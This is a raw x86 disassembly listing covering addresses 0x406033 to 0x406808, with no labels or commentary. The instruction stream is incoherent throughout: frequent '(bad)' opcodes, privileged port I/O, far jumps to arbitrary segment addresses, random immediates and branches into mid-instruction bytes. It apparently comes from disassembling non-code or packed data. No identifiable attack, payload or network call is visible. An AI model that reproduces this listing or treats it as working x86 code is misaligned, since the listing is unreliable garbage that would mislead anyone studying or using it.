  406033:	fsub   DWORD PTR [ecx-0x7090f6d6]
  406039:	les    edx,FWORD PTR [eax+0x5a27b7f2]
  40603f:	ja     0x406070
  406041:	(bad)  
  406042:	frstor [edi+0x71064221]
  406048:	loop   0x40607e
  40604a:	push   ds
  40604b:	fisubr WORD PTR [edx-0x66]
  40604e:	stc    
  40604f:	inc    esi
  406050:	ss popf 
  406052:	popa   
  406053:	mov    cl,0x80
  406055:	addr16 retf 0xb8f2
  406059:	aam    0x14
  40605b:	push   eax
  40605c:	and    eax,0x32a61bde
  406061:	sbb    al,0xb4
  406063:	mov    cl,0x3c
  406065:	dec    ebp
  406066:	push   ebx
  406067:	and    esp,DWORD PTR [edi+0x4d]
  40606a:	jle    0x405ff5
  40606c:	sbb    ebx,DWORD PTR [edi+ebp*4+0x7]
  406070:	jl     0x406034
  406072:	loope  0x40607d
  406074:	mov    fs:0xf1993c09,al
  40607a:	and    eax,0xea761a3f
  40607f:	sub    BYTE PTR [edx-0x52],bh
  406082:	scas   al,BYTE PTR es:[edi]
  406083:	or     ebp,DWORD PTR fs:[eax+0x2dac7612]
  40608a:	(bad)  
  40608b:	xlat   BYTE PTR ds:[ebx]
  40608c:	push   cs
  40608d:	ja     0x4060b4
  40608f:	pushf  
  406090:	pop    ebp
  406091:	out    0x95,al
  406093:	sbb    al,0xd2
  406095:	in     al,0x8b
  406097:	aad    0xd0
  406099:	bound  edi,QWORD PTR [ecx]
  40609b:	out    0xb2,eax
  40609d:	scas   eax,DWORD PTR es:[edi]
  40609e:	mov    ch,ch
  4060a0:	jmp    0x406083
  4060a2:	add    ebx,ecx
  4060a4:	push   0xffffff9c
  4060a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060a7:	fcomip st,st(3)
  4060a9:	jb     0x40604f
  4060ab:	mov    ds:0x32487d39,al
  4060b0:	(bad)  
  4060b1:	idiv   BYTE PTR [edx-0x62]
  4060b4:	mov    bl,0x27
  4060b6:	mov    eax,0x6ca473aa
  4060bb:	jae    0x4060f6
  4060bd:	stos   BYTE PTR es:[edi],al
  4060be:	imul   ebp,DWORD PTR [ebp+0x439660ca],0xb1c911d0
  4060c8:	or     esp,esi
  4060ca:	sahf   
  4060cb:	or     bl,dh
  4060cd:	mov    DWORD PTR [edi+0x6d],ebp
  4060d0:	mov    BYTE PTR [bx+di],bh
  4060d3:	sub    BYTE PTR [eax+0x6fde30ee],bl
  4060d9:	mov    esp,0x23b8e5aa
  4060de:	pop    ebx
  4060df:	scas   al,BYTE PTR es:[edi]
  4060e0:	repz (bad) 
  4060e2:	fldcw  WORD PTR [edx]
  4060e4:	clc    
  4060e5:	icebp  
  4060e6:	stc    
  4060e7:	(bad)  
  4060e8:	ins    DWORD PTR es:[edi],dx
  4060e9:	cli    
  4060ea:	mov    al,ds:0x64935715
  4060ef:	lea    ecx,[ebp+0x77]
  4060f2:	push   esp
  4060f3:	xor    esp,DWORD PTR [edi-0x2f]
  4060f6:	pushf  
  4060f7:	hlt    
  4060f8:	lock mov BYTE PTR [ecx-0x2],ah
  4060fc:	pop    ecx
  4060fd:	mov    ds:0x7a035a27,al
  406102:	and    eax,0x1a76d0bf
  406107:	fmul   DWORD PTR [ebx+0xd]
  40610a:	lock sub eax,0xb9555293
  406110:	jp     0x40614d
  406112:	push   ebx
  406113:	(bad)  
  406114:	sub    BYTE PTR [ecx+0x23d0ccc],bh
  40611a:	or     ah,BYTE PTR [edx+0x52]
  40611d:	push   esi
  40611e:	pusha  
  40611f:	dec    edx
  406120:	dec    edi
  406121:	(bad)  
  406122:	enter  0xf5e4,0xfd
  406126:	and    BYTE PTR [ebx+ebp*8+0x50aba463],ah
  40612d:	fimul  DWORD PTR [edi-0x39]
  406130:	jge    0x4060ff
  406132:	xor    DWORD PTR [edi+0x1392f520],eax
  406138:	or     eax,0xea45ba48
  40613d:	retf   
  40613e:	mov    ds:0xa82af3d8,eax
  406143:	enter  0xede0,0x4e
  406147:	dec    edx
  406148:	nop
  406149:	jb     0x4061a8
  40614b:	and    ebp,DWORD PTR [ebx]
  40614d:	(bad)  
  40614e:	aaa    
  40614f:	jmp    0xfd30:0xfe276861
  406156:	jae    0x406165
  406158:	jo     0x4061c4
  40615a:	das    
  40615b:	xor    ah,bl
  40615d:	je     0x40610b
  40615f:	in     eax,0xdf
  406161:	pop    es
  406162:	jmp    0x4060fd
  406164:	dec    esi
  406165:	cmp    eax,0x356bfb48
  40616a:	repz scas al,BYTE PTR es:[edi]
  40616c:	sbb    DWORD PTR [edi],ecx
  40616e:	je     0x4061b4
  406170:	pop    eax
  406171:	popf   
  406172:	or     edi,esp
  406174:	xor    dl,bl
  406176:	dec    ecx
  406177:	mov    DWORD PTR [edx+0x5b34bf22],ebx
  40617d:	stos   DWORD PTR es:[edi],eax
  40617e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40617f:	dec    ebx
  406180:	pusha  
  406181:	mov    WORD PTR [eax+0x310a3f05],ss
  406187:	ret    0xe350
  40618a:	cdq    
  40618b:	sub    edi,DWORD PTR [esi-0x1c04d1cb]
  406191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406192:	xor    DWORD PTR [eax-0x570867bc],ebx
  406198:	fnstenv [edi]
  40619a:	and    BYTE PTR [ecx+0x545152a],bh
  4061a0:	sub    cl,BYTE PTR [ecx]
  4061a2:	outs   dx,BYTE PTR ds:[esi]
  4061a3:	jae    0x406182
  4061a5:	fdiv   st,st(2)
  4061a7:	into   
  4061a8:	jno    0x40615d
  4061aa:	mov    ch,0xdc
  4061ac:	pop    ds
  4061ad:	adc    bh,BYTE PTR [ebx]
  4061af:	add    al,0x3f
  4061b1:	test   BYTE PTR [ecx],dl
  4061b3:	enter  0xe9fe,0x21
  4061b7:	push   ebp
  4061b8:	jecxz  0x4061bd
  4061ba:	and    al,0xd0
  4061bc:	mov    WORD PTR [ecx],cs
  4061be:	mov    edx,0x829f5f5f
  4061c3:	and    al,0x71
  4061c5:	inc    eax
  4061c6:	or     esi,DWORD PTR [esi]
  4061c8:	fnsave [eax-0x52]
  4061cb:	pushf  
  4061cc:	pop    ecx
  4061cd:	inc    esi
  4061ce:	adc    BYTE PTR [edi+0x7c],ch
  4061d1:	sbb    esi,edx
  4061d3:	hlt    
  4061d4:	fst    QWORD PTR [ebp+0x58dcba89]
  4061da:	int    0x8d
  4061dc:	pop    ds
  4061dd:	lea    ebx,[esi]
  4061df:	jns    0x40620b
  4061e1:	iret   
  4061e2:	add    eax,0x2838b854
  4061e7:	fist   WORD PTR [ebx-0x36]
  4061ea:	std    
  4061eb:	fwait
  4061ec:	out    0x49,al
  4061ee:	lds    ebp,FWORD PTR [esi]
  4061f0:	popa   
  4061f1:	cdq    
  4061f2:	test   esp,esi
  4061f4:	imul   ecx,DWORD PTR [ebp-0x21a1a8c3],0x24dc8432
  4061fe:	adc    DWORD PTR [eax],edi
  406200:	(bad)  [ecx+0x1b]
  406203:	dec    esp
  406204:	in     al,0x35
  406206:	lods   eax,DWORD PTR ds:[esi]
  406207:	mov    DWORD PTR [eax-0xd1f8e95],eax
  40620d:	pop    ss
  40620e:	sub    BYTE PTR [ebx-0x28fd584f],ah
  406214:	xchg   ecx,eax
  406215:	mov    ecx,0x183f62be
  40621a:	mov    al,0x2f
  40621c:	lds    ebp,FWORD PTR [ecx-0x17]
  40621f:	ret    0x5b3f
  406222:	rcl    DWORD PTR [esi+0x4bb9f8ca],1
  406228:	cmp    al,0x90
  40622a:	pop    ds
  40622b:	mov    cl,dl
  40622d:	out    dx,eax
  40622e:	in     al,dx
  40622f:	push   ebp
  406230:	adc    eax,0x2f8c1c75
  406235:	pusha  
  406236:	push   cs
  406237:	pushf  
  406238:	push   edi
  406239:	xchg   esi,eax
  40623a:	dec    eax
  40623b:	push   0x4f
  40623d:	int    0x96
  40623f:	mov    bh,0x35
  406241:	paddd  mm1,mm3
  406244:	data16 das 
  406246:	out    0xc0,al
  406248:	(bad)  [ecx]
  40624a:	mov    ebx,0x2c9cebd2
  40624f:	mov    WORD PTR [edx+edx*4+0x45],cs
  406253:	add    eax,ecx
  406255:	in     eax,0x7
  406257:	mov    bh,cl
  406259:	and    eax,0xda8f4a9d
  40625e:	pop    edi
  40625f:	into   
  406260:	add    bh,0x9
  406263:	sub    bl,ah
  406265:	cwde   
  406266:	pusha  
  406267:	maskmovq mm2,(bad)
  406268:	not    DWORD PTR [edx+ebx*8]
  40626b:	(bad)  
  40626c:	aam    0xa7
  40626e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40626f:	pop    ds
  406270:	sahf   
  406271:	push   eax
  406272:	ins    BYTE PTR es:[edi],dx
  406273:	mov    BYTE PTR [edx-0x53af8daf],cl
  406279:	mov    dl,0x81
  40627b:	sub    DWORD PTR [ebx-0x155484f0],edi
  406281:	clc    
  406282:	les    edi,FWORD PTR [ecx]
  406284:	mov    bl,0x21
  406286:	jecxz  0x40626d
  406288:	dec    edx
  406289:	push   esp
  40628a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40628b:	jae    0x40629f
  40628d:	mov    ebx,DWORD PTR [ebx-0x25]
  406290:	jns    0x4062e0
  406292:	js     0x4062c3
  406294:	(bad)  
  406295:	outs   dx,DWORD PTR ds:[esi]
  406296:	cli    
  406297:	dec    eax
  406298:	xor    esp,DWORD PTR [ecx-0x4d]
  40629b:	(bad)  
  40629c:	push   eax
  40629d:	outs   dx,DWORD PTR ds:[esi]
  40629e:	mov    dh,0x89
  4062a0:	ret    0xbfa2
  4062a3:	lock nop
  4062a5:	es inc esp
  4062a7:	retf   0x39c5
  4062aa:	(bad)  
  4062ac:	int    0x65
  4062ae:	adc    BYTE PTR [edi+0x7d],0xa8
  4062b2:	test   BYTE PTR [eax-0x7ca0d27],ah
  4062b8:	cmp    ah,BYTE PTR [edi+ebx*4-0x402ba9df]
  4062bf:	rcr    DWORD PTR [esi-0x2bd3565c],1
  4062c5:	aam    0x89
  4062c7:	daa    
  4062c8:	cmp    BYTE PTR [ebx+0x38ee66d1],dl
  4062ce:	pusha  
  4062cf:	push   cs
  4062d0:	mov    ebx,0x614767b6
  4062d5:	(bad)  
  4062d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062d8:	sar    BYTE PTR [ecx+0x22],0x8e
  4062dc:	cli    
  4062dd:	jl     0x4062e8
  4062df:	repnz inc eax
  4062e1:	push   cs
  4062e2:	fstp   DWORD PTR [eax+0x72]
  4062e5:	div    ecx
  4062e7:	mov    ecx,DWORD PTR [ebp+0x10]
  4062ea:	jmp    0x4065da
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0x73889d5c
  4062fe:	mov    edi,0x7878c7de
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x406306
  406308:	or     BYTE PTR [edx-0x52cbd4b2],0xb5
  40630f:	push   esi
  406310:	(bad)  
  406311:	pusha  
  406312:	(bad)  
  406313:	rcr    DWORD PTR [ebp-0x3b],0xb8
  406317:	pop    edi
  406318:	mov    BYTE PTR [edx],0x26
  40631b:	dec    ecx
  40631c:	push   0xffffffd5
  40631e:	dec    ecx
  40631f:	cdq    
  406320:	aaa    
  406321:	retf   
  406322:	in     eax,0xf6
  406324:	out    dx,al
  406325:	les    edi,FWORD PTR [ebp+0x1c]
  406328:	lods   al,BYTE PTR ds:[esi]
  406329:	repnz xchg edi,eax
  40632b:	inc    ecx
  40632c:	pop    esi
  40632d:	push   esp
  40632e:	(bad)  
  40632f:	push   cs
  406330:	mov    al,ds:0xf43c4621
  406335:	shr    BYTE PTR [ebp+ecx*8+0x3de3a0f4],1
  40633c:	repz (bad) 
  40633e:	dec    esp
  40633f:	ss or  eax,0x3b3113ff
  406345:	fild   WORD PTR [edi+0x0]
  406348:	mov    ebx,0x37e3b0aa
  40634d:	outs   dx,DWORD PTR ds:[esi]
  40634e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40634f:	mov    ebx,0xf56b0643
  406354:	loop   0x406375
  406356:	shl    DWORD PTR [ebp+0x7d],1
  406359:	cdq    
  40635a:	mov    cl,0x0
  40635c:	jo     0x40637a
  40635e:	daa    
  40635f:	lea    ecx,[edi]
  406361:	lods   eax,DWORD PTR ds:[esi]
  406362:	in     eax,dx
  406363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406364:	and    ch,0x39
  406367:	push   esi
  406368:	leave  
  406369:	sti    
  40636a:	les    esp,FWORD PTR [edi]
  40636c:	mul    DWORD PTR [eax+0x60d1f513]
  406372:	js     0x406335
  406374:	pop    ecx
  406375:	and    ah,BYTE PTR [edi]
  406377:	outs   dx,BYTE PTR ds:[esi]
  406378:	sbb    al,0xaf
  40637a:	lea    edi,[edi-0x5e655a44]
  406380:	and    ecx,DWORD PTR ds:0x5abbccdd
  406386:	cmp    ecx,esp
  406388:	xchg   ecx,eax
  406389:	mov    DWORD PTR [edi-0x2f8283b1],edi
  40638f:	xor    al,0xb6
  406391:	prefetch (bad)
  406392:	or     eax,0x17cd95dd
  406397:	dec    edx
  406398:	sbb    ebp,DWORD PTR [ebp-0x6bde36fe]
  40639e:	jmp    0x21de:0xdbc6bf10
  4063a5:	xchg   ecx,eax
  4063a6:	in     eax,0x86
  4063a8:	and    DWORD PTR [edx],edi
  4063aa:	and    eax,0x784d71af
  4063af:	aas    
  4063b0:	jg     0x4063ea
  4063b2:	test   DWORD PTR [edx],edx
  4063b4:	mov    edx,0xd29384a6
  4063b9:	icebp  
  4063ba:	(bad)  
  4063bc:	sbb    BYTE PTR [ecx],bl
  4063be:	ja     0x40635e
  4063c0:	inc    eax
  4063c1:	adc    edx,DWORD PTR [esi]
  4063c3:	fistp  DWORD PTR [edx-0x50]
  4063c6:	pop    ds
  4063c7:	loopne 0x406373
  4063c9:	ins    DWORD PTR es:[edi],dx
  4063ca:	jnp    0x4063dc
  4063cc:	push   eax
  4063cd:	and    ebp,DWORD PTR ds:0x75b66a99
  4063d3:	and    edx,DWORD PTR [edx+0x7e]
  4063d6:	stos   BYTE PTR es:[edi],al
  4063d7:	rol    DWORD PTR [eax],1
  4063d9:	jecxz  0x4063c1
  4063db:	fstp   TBYTE PTR [ecx]
  4063de:	or     esi,DWORD PTR [ebx]
  4063e0:	xlat   BYTE PTR ds:[ebx]
  4063e1:	pusha  
  4063e2:	cli    
  4063e3:	aam    0xa8
  4063e5:	mov    bh,0x8c
  4063e7:	pushf  
  4063e8:	and    BYTE PTR [edx],ah
  4063ea:	sbb    eax,0xcdc1523e
  4063ef:	sub    ecx,esi
  4063f1:	mov    esi,0xa91adbd1
  4063f6:	mul    DWORD PTR [edx-0x5]
  4063f9:	xchg   ecx,eax
  4063fa:	pop    esp
  4063fb:	aaa    
  4063fc:	mov    dh,0xbb
  4063fe:	mov    eax,ebx
  406400:	iret   
  406401:	push   esp
  406402:	mov    ds:0x36f3cfc2,al
  406407:	sbb    ebx,DWORD PTR [esi]
  406409:	mov    esi,0xb3d50697
  40640e:	or     DWORD PTR [edx+ebx*1+0x5209b6ba],edi
  406415:	mov    bl,0xb1
  406417:	sbb    eax,0x98950db
  40641c:	mov    esp,0x3bffc8cd
  406421:	addr16 sbb al,0xcb
  406424:	and    eax,0x2642a51b
  406429:	xor    DWORD PTR ds:0x447aab8d,ebp
  40642f:	cmp    DWORD PTR [esi+0x6e7c05eb],eax
  406435:	xor    BYTE PTR [eax+edi*8],ah
  406438:	dec    esi
  406439:	and    eax,0x585e2450
  40643e:	xor    dl,ch
  406440:	mov    ds:0x4bea009a,eax
  406445:	js     0x406476
  406447:	scas   eax,DWORD PTR es:[edi]
  406448:	dec    esp
  406449:	scas   eax,DWORD PTR es:[edi]
  40644a:	xchg   edi,eax
  40644b:	xchg   ebx,eax
  40644c:	push   esi
  40644d:	retf   
  40644e:	add    al,0x97
  406450:	push   edi
  406451:	fild   DWORD PTR [ebx+0x62c0ada8]
  406457:	jns    0x40643a
  406459:	or     DWORD PTR [edi],eax
  40645b:	cld    
  40645c:	stos   DWORD PTR es:[edi],eax
  40645d:	jl     0x406408
  40645f:	lock cmp eax,0xeed6f856
  406465:	mov    ds:0x6a34bf6d,al
  40646a:	int    0xd3
  40646c:	mov    WORD PTR [ecx-0x100ead04],fs
  406472:	bound  ebx,QWORD PTR [ebx-0x4017a268]
  406478:	sbb    dh,bh
  40647a:	xchg   ebp,eax
  40647b:	xchg   edx,eax
  40647c:	shr    esi,0xf6
  40647f:	sub    DWORD PTR [edx],ebp
  406481:	sub    cl,bh
  406483:	sbb    eax,0xf529fccc
  406488:	loop   0x4064a8
  40648a:	fisttp WORD PTR [esp+ebx*2+0x64]
  40648e:	ret    0x7626
  406491:	cdq    
  406492:	pop    ebp
  406493:	sbb    eax,0x2c192b3
  406498:	and    bh,cl
  40649a:	fdivr  QWORD PTR [edx+0x1af5c32d]
  4064a0:	cli    
  4064a1:	in     eax,dx
  4064a2:	icebp  
  4064a3:	(bad)  
  4064a5:	js     0x4064c0
  4064a7:	jmp    eax
  4064a9:	das    
  4064aa:	(bad)  
  4064ab:	repnz and eax,0xd2421c29
  4064b1:	xchg   esi,eax
  4064b2:	call   0x90dd:0x17c3cf1d
  4064b9:	mov    eax,0x54cb6905
  4064be:	xchg   esp,eax
  4064bf:	mov    ds:0x8816e44c,al
  4064c4:	dec    ecx
  4064c5:	je     0x406466
  4064c7:	inc    eax
  4064c8:	mov    edi,0x8bb905d8
  4064cd:	push   ebp
  4064ce:	cmp    ah,BYTE PTR [edi+ecx*2]
  4064d1:	dec    edx
  4064d2:	mov    ecx,DWORD PTR [edi-0x2b]
  4064d5:	aad    0x3a
  4064d7:	add    al,0xc9
  4064d9:	push   esi
  4064da:	test   eax,0x81a9a909
  4064df:	mov    ebp,0xe716b08e
  4064e4:	sub    edx,edi
  4064e6:	dec    esi
  4064e7:	je     0x4064ef
  4064e9:	hlt    
  4064ea:	sbb    cl,al
  4064ec:	mov    ebx,0x80600b5b
  4064f1:	adc    al,0x43
  4064f3:	add    dl,BYTE PTR [esi+ebx*8-0x56]
  4064f7:	xchg   BYTE PTR [ebx-0x1af4e0b9],cl
  4064fd:	fwait
  4064fe:	inc    esp
  4064ff:	dec    eax
  406500:	mov    eax,ds:0xdbc783bd
  406505:	push   esp
  406506:	sbb    eax,0xe84ef6d5
  40650b:	mov    WORD PTR [ebx+edi*1+0x728b8eed],gs
  406512:	sub    cl,BYTE PTR [ebp-0x28]
  406515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406516:	dec    ebp
  406517:	je     0x406575
  406519:	cdq    
  40651a:	jmp    0x406547
  40651c:	xchg   BYTE PTR [edi+0x60],bh
  40651f:	in     al,dx
  406520:	sbb    BYTE PTR [eax-0x6afe34cf],ah
  406526:	xchg   edi,eax
  406527:	pop    ebp
  406528:	add    DWORD PTR [edi+0x710eb131],edi
  40652e:	cmp    al,0x64
  406530:	stos   BYTE PTR es:[edi],al
  406531:	mov    dl,0x32
  406533:	arpl   WORD PTR [ebx],sp
  406535:	and    ch,BYTE PTR [esi]
  406537:	mul    BYTE PTR [edx+0x56]
  40653a:	out    0xeb,eax
  40653c:	pop    ecx
  40653d:	daa    
  40653e:	fild   DWORD PTR [eax+0x7187714c]
  406544:	sbb    BYTE PTR [edi],0x88
  406547:	mov    dl,0x85
  406549:	ftst   
  40654b:	xor    DWORD PTR [eax+0x7aeacadb],edx
  406551:	sub    BYTE PTR [edi+0x61a48c6e],dl
  406557:	mov    es,WORD PTR [ebp+0x68]
  40655a:	stos   BYTE PTR es:[edi],al
  40655b:	sbb    ebp,DWORD PTR [ecx-0x41]
  40655e:	sbb    eax,DWORD PTR [eax]
  406560:	or     BYTE PTR [ebp+0x1293896f],ch
  406566:	mov    eax,0x992372eb
  40656b:	outs   dx,BYTE PTR ds:[esi]
  40656c:	scas   eax,DWORD PTR es:[edi]
  40656d:	pop    es
  40656e:	mov    ah,0x5f
  406570:	scas   al,BYTE PTR es:[edi]
  406571:	push   eax
  406572:	pop    esp
  406573:	mov    ebp,0xa2c78c74
  406578:	xor    ah,bl
  40657a:	sbb    al,0xcc
  40657c:	and    al,0x51
  40657e:	in     al,0x27
  406580:	sub    DWORD PTR [ebp*8-0x70231637],esp
  406587:	sahf   
  406588:	jge    0x406557
  40658a:	push   ebp
  40658b:	mov    ebx,0xc475f329
  406590:	ret    
  406591:	add    esi,esi
  406593:	stc    
  406594:	or     edi,ecx
  406596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406597:	bound  ecx,QWORD PTR [edx]
  406599:	retf   0xff33
  40659c:	add    BYTE PTR [esi+edx*8],0x18
  4065a0:	push   ebp
  4065a1:	or     DWORD PTR [ecx+0x5a6142b6],0xfdd04c41
  4065ab:	inc    ebp
  4065ac:	ror    BYTE PTR [edi-0x3a],cl
  4065af:	das    
  4065b0:	loope  0x4065f9
  4065b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065b3:	inc    ebx
  4065b4:	scas   al,BYTE PTR es:[edi]
  4065b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065b6:	xchg   edi,eax
  4065b7:	imul   eax,DWORD PTR [edi],0x11d00745
  4065bd:	rol    DWORD PTR ds:0x592707b8,1
  4065c3:	xchg   esi,eax
  4065c4:	and    BYTE PTR [edi],cl
  4065c6:	aas    
  4065c7:	adc    eax,0x3a75448a
  4065cc:	into   
  4065cd:	mov    esp,edi
  4065cf:	call   0x53c5:0x342db324
  4065d6:	mov    ch,0x8f
  4065d8:	sahf   
  4065d9:	dec    eax
  4065da:	and    ecx,eax
  4065dc:	or     ecx,0x81161d8e
  4065e2:	mov    eax,ecx
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	(bad)  
  4065f6:	mov    eax,0xc433a859
  4065fb:	js     0x406675
  4065fd:	dec    ebp
  4065fe:	jle    0x406678
  406600:	js     0x406588
  406602:	leave  
  406603:	mov    eax,0xb4ce2279
  406608:	sub    eax,0xf1f200d6
  40660d:	mov    esp,0x9167c66d
  406612:	fild   WORD PTR ds:[eax-0x72b79a15]
  406619:	ret    0x8c2c
  40661c:	add    ebx,edi
  40661e:	or     BYTE PTR [edx-0xac48d09],ch
  406624:	pop    ss
  406625:	add    al,0x5e
  406627:	or     dl,dh
  406629:	popf   
  40662a:	clc    
  40662b:	and    BYTE PTR [edx+edx*1],dh
  40662e:	push   ecx
  40662f:	inc    ecx
  406630:	and    eax,0x5edd7dda
  406635:	mov    dl,0xfd
  406637:	std    
  406638:	xor    eax,0x7c161524
  40663d:	sub    esp,ebp
  40663f:	fldenv [esi+0x4]
  406642:	int    0x1b
  406644:	pop    eax
  406645:	pop    ebx
  406646:	in     eax,dx
  406647:	mov    DWORD PTR [edx-0x61],edi
  40664a:	cmp    al,0x2c
  40664c:	clc    
  40664d:	icebp  
  40664e:	jge    0x40665d
  406650:	xchg   BYTE PTR [edi+ebx*4],dl
  406653:	or     ch,BYTE PTR [ecx]
  406655:	(bad)  
  406656:	fld    DWORD PTR [edi-0x69]
  406659:	ret    0xc177
  40665c:	arpl   WORD PTR [esp+ebx*2-0x2],cx
  406660:	call   0xcaa55cc7
  406665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406666:	sbb    ch,0x58
  406669:	jns    0x4066b7
  40666b:	xchg   esp,eax
  40666c:	leave  
  40666d:	test   eax,0xfe9108a6
  406672:	jg     0x406640
  406674:	xor    eax,esp
  406676:	pusha  
  406677:	or     al,ah
  406679:	mov    ebp,0xb20d7312
  40667e:	jmp    0xd8bce976
  406683:	or     al,0x40
  406685:	lods   eax,DWORD PTR ds:[esi]
  406686:	popf   
  406687:	mov    eax,0x659c0719
  40668c:	jnp    0x40660f
  40668e:	inc    edi
  40668f:	call   0xf53c:0xc48d0a78
  406696:	in     al,dx
  406697:	adc    BYTE PTR [edx+0x72],0xd7
  40669b:	sar    DWORD PTR [edx+0x50],1
  40669e:	(bad)  
  40669f:	repz int 0x8a
  4066a2:	out    dx,eax
  4066a3:	(bad)  
  4066a4:	xor    eax,edx
  4066a6:	sbb    ah,BYTE PTR [edi+edi*1-0x3bf334c4]
  4066ad:	retf   
  4066ae:	aad    0x16
  4066b0:	inc    esp
  4066b1:	adc    eax,0xfebd6c81
  4066b6:	mov    cl,0x73
  4066b8:	push   cs
  4066b9:	bound  edx,QWORD PTR [ecx-0x7c]
  4066bc:	(bad)  
  4066bd:	xor    eax,0xa93363d6
  4066c2:	sbb    eax,0x2fa34c1b
  4066c7:	or     DWORD PTR [ebx-0x16],edi
  4066ca:	cmp    bl,0x65
  4066cd:	xlat   BYTE PTR ds:[ebx]
  4066ce:	adc    al,0xfa
  4066d0:	cld    
  4066d1:	in     eax,0x97
  4066d3:	sub    al,0xf3
  4066d5:	adc    esp,DWORD PTR [edi+edx*2-0x1603bcbd]
  4066dc:	ds fscale 
  4066df:	mov    dh,0x8
  4066e1:	add    al,0xe8
  4066e3:	sub    al,0x48
  4066e5:	ins    DWORD PTR es:[edi],dx
  4066e6:	mov    al,0xf4
  4066e8:	lea    esi,[ebp+0x31]
  4066eb:	and    DWORD PTR [ecx+esi*1+0x68],edi
  4066ef:	dec    esi
  4066f0:	mov    ch,0xf5
  4066f2:	and    al,0xe5
  4066f4:	fadd   QWORD PTR [ebx+0x7b]
  4066f7:	idiv   BYTE PTR [eax]
  4066f9:	jle    0x4066e0
  4066fb:	and    eax,0xf87c4a31
  406700:	jbe    0x4066dc
  406702:	mov    edx,0x1c9896b5
  406707:	aad    0x3b
  406709:	sbb    BYTE PTR [edx-0x7066fc4c],bl
  40670f:	xchg   ebp,eax
  406710:	and    eax,0x4ef0d8d5
  406715:	jl     0x406745
  406717:	add    ebx,DWORD PTR [ebx]
  406719:	mov    dh,0x29
  40671b:	adc    esi,eax
  40671d:	cmp    ebp,0x3a
  406720:	jl     0x40670d
  406722:	or     esp,ecx
  406724:	ret    0xf52e
  406727:	(bad)  
  406728:	cmp    edx,ebx
  40672a:	or     ebx,DWORD PTR [edi-0x6e756c7b]
  406730:	jbe    0x40673b
  406732:	mov    ds:0x8f92d78d,eax
  406737:	or     eax,DWORD PTR [bx+si]
  40673a:	jl     0x4066f2
  40673c:	(bad)  
  40673d:	dec    ebx
  40673e:	lea    esi,[ebx-0x52]
  406741:	ja     0x4067ad
  406743:	pop    esp
  406744:	cmp    BYTE PTR [eax],dh
  406746:	shl    BYTE PTR [edi+0x79],cl
  406749:	jge    0x406768
  40674b:	pop    ebx
  40674c:	push   ebx
  40674d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40674e:	inc    eax
  40674f:	fadd   QWORD PTR [ecx]
  406751:	pop    ebx
  406752:	and    eax,0xb2152136
  406757:	jmp    0xc741894c
  40675c:	jb     0x40671a
  40675e:	sahf   
  40675f:	or     bl,bl
  406761:	jno    0x4066e3
  406763:	fst    DWORD PTR [eax]
  406765:	jge    0x4067c2
  406767:	jno    0x406798
  406769:	or     DWORD PTR [edi],eax
  40676b:	rcl    DWORD PTR [esi+0x6c],1
  40676e:	das    
  40676f:	int    0xab
  406771:	ds dec edx
  406773:	in     al,0xbf
  406775:	push   0x3f68f82a
  40677a:	sti    
  40677b:	jp     0x406779
  40677d:	push   ebp
  40677e:	cld    
  40677f:	cmp    al,0x4c
  406781:	xchg   esi,eax
  406782:	add    dh,BYTE PTR ds:0x62502663
  406788:	fimul  WORD PTR [eax-0x6]
  40678b:	and    al,0x7a
  40678d:	shl    DWORD PTR [ebp+0x113d2389],0x43
  406794:	dec    ebx
  406795:	pop    ebx
  406796:	loop   0x406769
  406798:	outs   dx,BYTE PTR ds:[esi]
  406799:	jg     0x4067c7
  40679b:	ins    BYTE PTR es:[edi],dx
  40679c:	xlat   BYTE PTR ds:[ebx]
  40679d:	fnstcw WORD PTR [edx+ecx*2]
  4067a0:	pop    edi
  4067a1:	fwait
  4067a2:	sub    BYTE PTR [ebx],ah
  4067a4:	in     eax,0xdc
  4067a6:	push   ds
  4067a7:	cmp    ecx,ebp
  4067a9:	mov    BYTE PTR [esi+eiz*4+0x75cff9b2],ch
  4067b0:	add    BYTE PTR [eax+0x54],bh
  4067b3:	mov    al,ds:0x7a24c232
  4067b8:	cmc    
  4067b9:	cmc    
  4067ba:	jb     0x4067b8
  4067bc:	rcr    BYTE PTR [eax+0x33],0x95
  4067c0:	les    ecx,FWORD PTR [ebx+edi*1-0x76bedc98]
  4067c7:	(bad)  
  4067c9:	sbb    edx,DWORD PTR cs:[ecx]
  4067cc:	cwde   
  4067cd:	in     eax,dx
  4067ce:	xchg   edi,eax
  4067cf:	ret    0x8ccb
  4067d2:	inc    ebx
  4067d3:	aam    0x98
  4067d5:	xor    BYTE PTR [ecx+0x6b],cl
  4067d8:	push   edi
  4067d9:	enter  0xd6e3,0xea
  4067dd:	jno    0x406770
  4067df:	retf   0x8c85
  4067e2:	sbb    dh,BYTE PTR [edi+0x44]
  4067e5:	das    
  4067e6:	xchg   DWORD PTR [edx+edi*2],ecx
  4067e9:	shr    BYTE PTR [ebx+0x6ae2a21c],1
  4067ef:	test   al,0x3a
  4067f1:	out    dx,al
  4067f2:	or     eax,0x4a321a24
  4067f7:	int3   
  4067f8:	das    
  4067f9:	lods   al,BYTE PTR ds:[esi]
  4067fa:	inc    DWORD PTR [esi+0x18]
  4067fd:	xchg   ebx,eax
  4067fe:	mov    edi,0x1de89cda
  406803:	mov    esi,0x8577d7ca
  406808:	mov    dh,0x22
